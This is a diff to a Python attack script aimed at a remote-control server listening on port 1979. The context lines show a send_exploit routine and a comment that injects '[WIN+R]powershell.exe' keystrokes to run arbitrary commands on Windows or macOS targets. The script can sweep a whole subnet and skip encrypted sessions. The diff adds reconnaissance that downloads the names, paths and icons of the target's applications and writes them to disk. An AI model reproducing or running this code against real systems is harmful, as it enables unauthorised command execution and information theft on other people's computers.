@@ -13,12 +13,20 @@ socket - Socket I/O library to send payloads with
 enum - Create special character enum
 re - Regex library for parsing commands
 time - Sleep for offsets
+os - Create directories
+werkzeug.utils - Safe filenames
+json - JSON I/O
+base64 - B64 encode binary data
 """
 import argparse
 import socket
 import enum
 import re
 import time
+import os
+import werkzeug.utils
+import json
+import base64
 
 
 """
@@ -239,14 +247,90 @@ def target_encrypted(target_ip: str) -> bool:
     return b'pwd pwd' in s.recv(1024)
 
 
+def get_appdata(target_ip: str) -> dict:
+    """
+    Gets application data broadcasted by the server
+
+    :param target_ip: IP address for the target
+    :type target_ip: str
+    :return: Application data dict
+    :rtype: dict
+    """
+    apps = []
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, 1979))
+    s.settimeout(0.5)
+    
+    # Send application request
+    s.send(b'act')
+
+    try:    
+        while True:
+            dok = s.recv(3) # Receive the OK
+            if dok != b'dok':
+                _error("Server did not acknolwedge request for applications")
+                break
+
+            buff_len = int.from_bytes(s.recv(4), 'little') # Get the length of the application information buffer    
+            buff = s.recv(buff_len) # Download the acutal buffer
+
+            app = {
+                'name': buff[:256].replace(b'\x00', b''),
+                'path': buff[256:1280].replace(b'\x00', b''),
+                'status': bool(int.from_bytes(buff[1280:1281], 'little')),
+                'windowhandle': int.from_bytes(buff[1281:1285], 'little'),
+                'intPre2': int.from_bytes(buff[1285:1289], 'little'), # not used by server
+                'bPre1': bool(int.from_bytes(buff[1289:1290], 'little')), # not used by server
+                'bPre2': bool(int.from_bytes(buff[1290:1291], 'little')), # not used by server
+                'icon_length': int.from_bytes(buff[1291:1295], 'little')
+            }
+            app['icon'] = s.recv(app['icon_length']) # Get the icon
+
+            # Convert binary fields to B64
+            app['name'] = base64.b64encode(app['name']).decode('ascii')
+            app['path'] = base64.b64encode(app['path']).decode('ascii')
+            app['icon'] = base64.b64encode(app['icon']).decode('ascii')
+            apps.append(app)
+
+            _success("Received the {} application from {}".format(app['name'], target_ip))
+    except socket.timeout:
+        pass
+    finally:
+        return apps
+
+
+def dump_appdata(appdata: dict, target_ip: str) -> None:
+    """
+    Dumps application data to directory
+
+    :param appdata: appdata from server
+    :type appdata: dict
+    :param target_ip: IP address for the target
+    :type target_ip: str
+    """
+    if not os.path.isdir(target_ip):
+        os.mkdir(target_ip)
+    
+    with open(target_ip+'/manifest.json', 'w') as f:
+        json.dump(appdata, f)
+    
+    for idx, app in enumerate(appdata):
+        with open(target_ip+'/app{}.png'.format(idx), 'wb') as f: # Write the PNG to file
+            f.write(base64.b64decode(app['icon']))
+    
+    _success("Dumped applications from {}".format(target_ip))
+
+
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--os', type=str, action='store', choices=('MacOS', 'Windows'), required=True, help="Signals what OS the target is running")
-    parser.add_argument('--cmd', type=str, action='store', required=True, help="Command to execute")
+    parser.add_argument('--os', type=str, action='store', choices=('MacOS', 'Windows'), help="Signals what OS the target is running")
+    parser.add_argument('--cmd', type=str, action='store', help="Command to execute")
     # parser.add_argument('--troll', type=str, action='store', choices=('delete',), help="Adds what trolling features you want to implement")
     parser.add_argument('--targets', type=str, action='store', default='-', help="Comma delimited list of targets, '-' if you want to target all IP addresses on the subnet")
     parser.add_argument('--hashes', type=str, action='store', default='', help="Comma delimited list of hashes that line up with the targets")
     parser.add_argument('--skip-encrypted', action='store_true', default=True, help="Skip the encrypted targets")
+    parser.add_argument('--dump-apps', action='store_true', default=True, help="Dumps apps advertised by the server")
     args = parser.parse_args()
 
     if args.os == 'MacOS':
@@ -261,19 +345,24 @@ def main():
     if args.hashes != [''] and len(args.hashes) != len(args.targets):
         raise ValueError("Number of hashes does not equal number of targets")
 
-    cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
-    time.sleep(5)
+    if args.cmd:
+        cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
     for target in args.targets:
+        
+        if args.dump_apps:
+            _info("Dumping application data from {}".format(target))
+            appdata = get_appdata(target)
+            dump_appdata(appdata, target)
+        
         encrypted = target_encrypted(target)
         if args.skip_encrypted and encrypted:
             _info("Skipping {} because of encryption".format(target))
             continue
-        _info("Executing '{}' against {} running on {} ({})".format(args.cmd, target, args.os, 'Encrypted session' if encrypted else 'Unencrypted session'))
-        send_exploit(cmd_pkts, target)
         
+        if args.cmd:
+            _info("Executing '{}' against {} running on {} ({})".format(args.cmd, target, args.os, 'Encrypted session' if encrypted else 'Unencrypted session'))
+            send_exploit(cmd_pkts, target)
         
-        
-
 
 if __name__ == "__main__":
     main()
